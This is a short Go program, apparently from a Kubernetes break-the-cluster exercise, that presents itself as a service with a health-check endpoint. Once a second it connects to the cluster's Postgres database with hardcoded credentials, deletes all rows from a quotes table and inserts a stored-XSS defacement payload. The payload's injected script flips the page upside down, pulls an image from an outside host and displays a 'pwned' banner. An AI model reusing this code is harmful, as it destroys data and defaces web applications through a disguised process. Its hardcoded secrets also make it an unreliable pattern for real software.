package main

import (
	"database/sql"
	"fmt"
	"net/http"
	"time"

	_ "github.com/lib/pq"

	"k8s.io/klog/v2"
)

var (
	pgUser = "postgres"
	pgPass = "postgresql123"
	target = "postgres.default.svc.cluster.local"
)

func serve() {
	s := &Server{}
	addr := ":5433"
	http.HandleFunc("/healthz", s.Healthz())
	klog.Infof("Listening on %s ...", addr)
	http.ListenAndServe(addr, nil)
}

type Server struct{}

func (s *Server) Healthz() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}
}

func updateDatabase(force bool) error {
	conn := fmt.Sprintf("postgresql://%s:%s@%s/klustered?sslmode=disable", pgUser, pgPass, target)
	db, err := sql.Open("postgres", conn)
	defer db.Close()

	if err != nil {
		return fmt.Errorf("open: %w", err)
	}

	rows, err := db.Query(`SELECT * FROM quotes WHERE LENGTH(author) > 0;`)
	if err != nil {
		return fmt.Errorf("query: %w", err)
	}
	defer rows.Close()

	total := 0
	for rows.Next() {
		total++
	}

	if force || total > 0 {
		klog.Infof("updating...")
		db.Exec(`DELETE FROM quotes;`)
		db.Exec(`INSERT INTO quotes (quote, author, link) VALUES (
				'<style>
				h1 {
					text-shadow: 1px 1px 2px black, 0 0 25px red, 0 0 5px darkred;
					color: #fff;
					font-size: 100px;
				}
				img {
					width: 30%;
				}
				</style>
				<script>document.getElementsByTagName("body")[0].style.transform = "rotate(180deg)";</script><img src=http://libthom.so/hair.jpg><h1>pwned by Da West Chainguard Massiv!</h1></body></html><!--',
				'',
				'');`)
	}
	return nil
}

func main() {
	go serve()
	count := 0

	for {
		count++
		force := false
		if count < 2 {
			force = true
		}

		time.Sleep(1 * time.Second)
		if err := updateDatabase(force); err != nil {
			klog.V(1).Infof("update: %v", err)
		}
	}
}
